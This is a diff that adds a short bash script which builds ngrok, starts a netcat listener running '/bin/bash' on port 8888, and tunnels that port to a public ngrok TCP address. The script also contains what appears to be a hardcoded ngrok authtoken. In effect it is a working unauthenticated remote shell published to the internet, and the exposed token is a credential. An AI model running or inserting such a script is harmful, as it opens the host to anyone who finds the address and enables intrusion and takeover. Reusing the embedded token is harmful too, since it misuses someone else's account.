@@ -1,0 +1,12 @@
+#!/bin/bash
+
+git clone git@github.com:inconshreveable/ngrok.git
+cd ngrok && make
+{
+    nc -l -v -p 8888 -e /bin/bash
+    killall -SIGINT ngrok && echo "ngrok terminated"
+} &
+{
+    ./ngrok tcp 8888 --authtoken=XtVgwNXH74FDpQrfaHEe_2DWxWhAn8bDdNapA9DH98 --log=stdout --log-level=debug | grep "tcp.ngrok.io" || true
+} &
+cd ..
